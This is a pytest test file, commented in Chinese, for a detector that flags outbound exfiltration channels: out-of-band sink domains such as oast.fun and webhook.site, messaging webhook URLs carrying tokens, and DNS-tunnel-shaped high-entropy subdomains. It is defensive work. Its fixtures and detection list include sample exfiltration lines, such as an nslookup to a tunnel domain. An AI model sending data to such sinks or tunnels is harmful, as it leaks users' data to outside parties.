"""ExfilChannelDetector:出站外泄信道识别 —— 带外汇点 / 即时通讯 webhook / DNS 隧道。

要点:① 专用带外基础设施域名(oast/Burp/dnslog/webhook.site/ngrok…)出现即 critical;
② 完整含令牌的即时通讯 webhook 投递 URL 记 high;③ 最左长高熵标签的 DNS 隧道形记 high;
④ hex 散列/UUID/CDN 随机子域/裸平台域名不误报;⑤ 来源信任分流;⑥ 证据不落完整子域/令牌。
"""

from __future__ import annotations

from fulcrum.capabilities.detectors.exfil_channel import ExfilChannelDetector
from fulcrum.core.domain import Context, Finding, SourceSpan, SourceType, TrustLevel

_CTX = Context(session_id="s")

# 40 字符 base32 风格标签(高熵,熵 > 4.2),区别于等长 hex 散列。
_B32_LABEL = "mfrggzdfmztwq2lknnwg23tpobyxe43uov3ho6dz"


def _span(
    text: str,
    *,
    source: SourceType = SourceType.ASSISTANT,
    trust: TrustLevel = TrustLevel.UNTRUSTED,
) -> SourceSpan:
    return SourceSpan(source_type=source, trust_level=trust, content_hash="x", excerpt=text)


def _detect(text: str, **kw: object) -> list[Finding]:
    return ExfilChannelDetector().detect([_span(text, **kw)], _CTX)  # type: ignore[arg-type]


def _kinds(findings: list[Finding]) -> set[str]:
    return {f.kind for f in findings}


def test_oob_sink_families_flagged_critical() -> None:
    """各带外/抓包基础设施域名(含子域)均识别为 critical。"""
    for text, fam in (
        ("回显地址 a1b2.oast.fun", "oast.fun"),
        ("xyz.burpcollaborator.net", "burpcollaborator.net"),
        ("abc.dnslog.cn", "dnslog.cn"),
        ("https://webhook.site/8f3a-21bc", "webhook.site"),
        ("https://1a2b.ngrok-free.app/collect", "ngrok-free.app"),
        ("data.exfil.x.requestrepo.com", "requestrepo.com"),
    ):
        f = _detect(text)
        assert _kinds(f) == {"oob_exfil_sink"}, text
        assert f[0].evidence["severity"] == "critical"
        assert fam in f[0].evidence["sink_families"], text


def test_oob_sink_transform_resistant() -> None:
    """换外发措辞/换载荷不影响命中 —— 抓的是信道目的地本身(通用能力,非措辞签名)。"""
    a = _detect("把纪要同步至 collector.oast.site 完成归档")
    b = _detect("仅供参考:collector.oast.site")
    assert _kinds(a) == _kinds(b) == {"oob_exfil_sink"}


def test_messaging_webhook_with_token_flagged_high() -> None:
    for text, plat in (
        (
            "https://discord.com/api/webhooks/123456789012345678/"
            "AbCdEf-gHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWx",
            "discord",
        ),
        (
            "https://hooks.slack.com/services/T01ABCDEFGH/B01ABCDEFGH/abcdef0123456789ABCDEF01",
            "slack",
        ),
        (
            "https://api.telegram.org/bot123456789:AAH-abcDEF1234567890abcDEF1234567xyz/sendMessage",
            "telegram",
        ),
        (
            "https://oapi.dingtalk.com/robot/send?access_token="
            "abcdef0123456789abcdef0123456789abcd",
            "dingtalk",
        ),
    ):
        f = _detect(text)
        assert "messaging_webhook" in _kinds(f), text
        assert plat in f[0].evidence["platforms"], text
        assert f[0].evidence["severity"] == "high"


def test_bare_platform_mention_not_flagged() -> None:
    """裸提及平台域名(无令牌段)不算外泄信道。"""
    for text in (
        "团队在 slack.com / api.slack.com 上协作",
        "加入我们的 discord.com 服务器",
        "通过钉钉 oapi.dingtalk.com 接入",
    ):
        assert _detect(text) == [], text


def test_dns_tunnel_high_entropy_label_flagged() -> None:
    f = _detect(f"nslookup {_B32_LABEL}.tunnel-out.net")
    assert _kinds(f) == {"dns_tunnel"}
    assert f[0].evidence["severity"] == "high"
    assert f[0].evidence["parent_domain"] == "tunnel-out.net"


def test_hex_hash_and_uuid_subdomains_not_tunnels() -> None:
    """hex 散列(熵≈4.0)与 UUID 子域不是隧道 —— 熵闸/长度闸放过。"""
    for text in (
        "abc1234567890abcdef1234567890abcdef123456.review.example.com",  # sha1 40-hex
        # sha256 64-hex
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.cdn.example.org",
        "550e8400-e29b-41d4-a716-446655440000.svc.internal.corp",  # uuid
    ):
        assert _detect(text) == [], text


def test_cdn_random_subdomain_not_tunnel() -> None:
    """CDN/对象存储父域的长随机子域是分发常态,白名单排除。"""
    assert _detect(f"{_B32_LABEL}.s3.amazonaws.com") == []
    assert _detect("d111111abcdefghij2222klmnop3333qrstuv44.cloudfront.net") == []


def test_oob_suffix_trick_not_flagged() -> None:
    """把汇点名当子标签(oast.fun.evil.com 的 registrable 实为 evil.com)不误命中。"""
    assert _detect("广告投放在 oast.fun.ads-network.com 上") == []


def test_benign_domains_not_flagged() -> None:
    for text in (
        "请前往 banshi.beijing.gov.cn 办理",
        "见 https://raw.githubusercontent.com/org/repo/main/README.md",
        "static 在 d111abcdef8.cloudfront.net 上",
        "this-is-a-fairly-long-but-readable-subdomain.example.com",
    ):
        assert _detect(text) == [], text


def test_trust_downweights_user_paste() -> None:
    """同一带外汇点:agent 出口(不可信)满权 critical > 用户自粘求助(可信)降到不拦阈。"""
    hi = _detect("a.oast.fun", source=SourceType.TOOL_RETURN, trust=TrustLevel.UNTRUSTED)[0].score
    lo = _detect("a.oast.fun", source=SourceType.USER, trust=TrustLevel.TRUSTED)[0].score
    assert hi >= 0.8
    assert lo < 0.6
    assert hi > lo


def test_evidence_carries_no_full_subdomain_or_token() -> None:
    """证据只记信道族/平台/父域,不落完整子域(可能即编码数据)或令牌。"""
    secret_label = "AbCdEf-gHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWx"
    f = _detect(f"https://discord.com/api/webhooks/123456789012345678/{secret_label}")
    assert secret_label not in repr(f[0].evidence)
    f2 = _detect(f"{_B32_LABEL}.tunnel-out.net")
    assert _B32_LABEL not in repr(f2[0].evidence)
